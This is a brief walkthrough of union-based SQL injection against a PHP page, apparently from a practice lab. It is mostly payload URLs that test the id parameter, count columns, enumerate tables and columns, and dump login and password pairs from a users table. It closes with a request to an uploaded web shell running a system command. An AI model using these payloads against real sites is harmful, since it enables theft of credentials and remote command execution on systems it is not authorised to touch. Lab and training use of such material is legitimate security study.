SQLi Walkthrough against URLs
=============================

We are first looking for something that resemebles a page file include, such as the ?id=1 below.
http://example.com/cat.php?id=1 


We can test for the likely presence of a SQLi vulnerablity by doing math in the URL.  Something like the following should return the page value of id=1. 
http://example.com/cat.php?id=2-1  

Additionally if we threw a ' we should break the SQL statement which should cause the page not to be loaded and throw an error message.

http://example.com/cat.php?id=1'

Next we are going to want to identify the amount of columns in the database.  This can be done through a numbers game untill the correct number is found (meaning no error message was generated).

http://example.com/cat.php?id=1%20union%20select%201,2,3,4

Once we have figured out which location is visible on the page (1,2,3,4) we can change that number to a SQL command to enumerate further.  Think of the numbers as "place holders".

http://ptl-fc9f9b773b.libcurl.so/cat.php?id=1 union select 1,database(),3,4
http://ptl-fc9f9b773b.libcurl.so/cat.php?id=1 union select 1,user()

Note the browser will preform URL encoding, so you will receive the following:
http://example.com/cat.php?id=1%20union%20select%201,database(),3,4


http://example.com/cat.php?id=1%20union%20select%201,table_name,3,4%20from%20information_schema.tables

we see a couple of interesting tables such as users

http://ptl-fc9f9b773b.libcurl.so/cat.php?id=1%20union%20select%201,column_name,3,4%20from%20information_schema.columns

So now we have the database names

http://example.com/cat.php?id=1 union select 1,login,3,4 from users


http://example.com/cat.php?id=1 union select 1,concat(login':'password),3,4 from users 

Can use concat to get both the username and password
example.com/cat.php?id=1 union select 1,concat(login,':',password),3,4 from users





view-source:http://example.com/admin/uploads/CMDshell.php4?cmd=uname%20-a